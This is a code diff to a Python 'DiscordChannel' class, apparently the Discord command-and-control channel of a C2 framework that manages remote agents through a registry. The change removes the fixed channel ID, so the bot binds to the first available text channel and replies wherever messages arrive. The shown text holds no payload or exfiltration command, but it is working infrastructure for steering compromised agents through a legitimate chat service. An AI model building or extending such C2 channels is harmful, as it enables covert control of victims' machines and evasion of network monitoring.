@@ -21,9 +21,8 @@ class DiscordChannel(C2Channel):
     Runs its own asyncio event loop in a dedicated daemon thread.
     """
 
-    def __init__(self, token: str, channel_id: int, registry: AgentRegistry):
+    def __init__(self, token: str, registry: AgentRegistry):
         self._token      = token
-        self._channel_id = channel_id
         self._registry   = registry
 
         self._loop: asyncio.AbstractEventLoop = None
@@ -109,25 +108,21 @@ class DiscordChannel(C2Channel):
         async def on_ready():
             log.info(f"[discord] Logged in as {self._client.user}")
 
-            self._target_channel = self._client.get_channel(self._channel_id)
-            if not self._target_channel:
-                log.error(
-                    f"[discord] Channel ID {self._channel_id} not found! "
-                    f"Available: "
-                    f"{[ch.name for g in self._client.guilds for ch in g.text_channels]}"
-                )
-                return
+            for g in self._client.guilds:
+                if g.text_channels:
+                    self._target_channel = g.text_channels[0]
+                    log.info(f"[discord] Bound to #{self._target_channel.name}")
+                    self._connected = True
+                    return
 
-            log.info(f"[discord] Bound to #{self._target_channel.name}")
-            self._connected = True
+            log.error("[discord] No text channels found!")
 
         @self._client.event
         async def on_message(message: discord.Message):
             if message.author == self._client.user:
                 return
 
-            if message.channel.id != self._channel_id:
-                return
+            self._target_channel = message.channel
 
             text = message.content or ""
             if not text:
